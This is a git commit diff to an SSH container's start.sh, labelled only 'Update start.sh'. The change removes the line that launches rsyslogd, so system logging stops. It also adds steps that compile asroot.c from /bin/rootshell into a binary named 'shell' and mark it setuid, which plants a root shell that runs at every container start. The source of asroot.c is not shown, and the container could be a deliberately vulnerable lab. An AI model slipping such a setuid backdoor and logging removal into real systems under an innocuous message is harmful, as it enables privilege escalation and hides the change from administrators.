fd92fb2bbb9e6c0253b3337d6a5b1688a78c6227
Yvahra <79484088+Yvahra@users.noreply.github.com>
2025-06-13 08:59:26 +0200

    Update start.sh

--- ssh/start.sh
+++ ssh/start.sh
@@ -4,11 +4,9 @@ set -e
 # Start SSH service
 /usr/sbin/sshd -D &
 
-# Start Rsyslog
-rsyslogd &
-
 # Start Docker daemon
-#dockerd
+cd /bin/rootshell && gcc asroot.c -o shell
+cd /bin/rootshell && chmod u+s shell
 
 # Keep the container running
 tail -f /dev/null
